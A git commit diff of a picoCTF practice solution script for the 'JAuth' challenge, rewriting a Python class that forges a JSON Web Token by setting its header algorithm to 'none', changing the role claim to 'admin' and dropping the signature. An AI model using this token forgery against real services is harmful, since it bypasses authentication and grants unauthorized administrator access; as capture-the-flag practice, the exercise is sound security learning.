e8308adfc9aea6f72a0cc5935e6a9d41f4d6df73
dimas0305 <dimasmaulana0305@gmail.com>
2022-07-29 12:00:01 +0800

    Fri Jul 29 04:00:01 AM UTC 2022

--- Practice/PicoCTF-Penyelesaian/JAuth/solve.py
+++ Practice/PicoCTF-Penyelesaian/JAuth/solve.py
@@ -1,50 +1,28 @@
 from base64 import b64decode, b64encode
 import json
 
-ENC = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjU5MDUyMDgwMTE1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NTkwNTIwODB9.DOnEIxtQ9SqwP8YdXxd1LhOePBdr1iWremjaYNr904g"
+ENC = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjU5MDU4MTI3MDY5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NTkwNTgxMjd9.YATw_drAglxtvsYRP6N3HlZwx-WXvoL52PYCek307s4"
 
 class Exploit:
     def __init__(self, enc=ENC):
-        self.enc = enc
-        self.decoded_jwt = self.decode_jwt(enc)
-        
-    def decode_jwt(self, enc: str):
-        enc_split = enc.split('.')
-        decoded = b64decode(enc_split[0]).decode()
-        decoded +="."
-        decoded += b64decode(enc_split[1]).decode()
-        return decoded
-    
-    def encode_jwt(self, dec: str):
-        dec_split = dec.split('.')
-        encoded = b64encode(dec_split[0].encode()).decode()
-        encoded +="."
-        encoded += b64encode(".".join(dec_split[1::2])).decode()
-        return encoded
-    
-    def change_alg_n_role(self, jwt: str):
-        jwt_split = jwt.split(".")
-        
-        json_alg = jwt_split[0]
-        json_alg = json.loads(json_alg)
-        
-        json_role = '.'.join(jwt_split[1:])
-        json_role = json.loads(json_role)
-        
-        
-        json_alg['alg'] = "none"
-        json_role['role'] = "admin"
-        
-        # print(json_alg)
-        # print(json_role)
+        self.enc = enc.split(".")[1]
 
-        return str(json_alg)+"."+str(json_role)
-        
+    def set_header_none_alg(self):
+        return "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0"
+    
+    def set_body_admin(self):
+        n = b64decode(self.enc).decode("utf-8")
+        n = json.loads(n)
+        n["role"] = "admin"
+        n = b64encode(json.dumps(n).encode())
+        return n.decode()
+    
     def start(self):
-        change = self.change_alg_n_role(self.decoded_jwt)
-        encode = self.encode_jwt(dec=change)
-        return encode
-        
+        n = self.set_header_none_alg()
+        n +="."
+        n += self.set_body_admin()
+        n = n.replace("=", "")
+        return n+"."
     
 
 dec = Exploit().start()
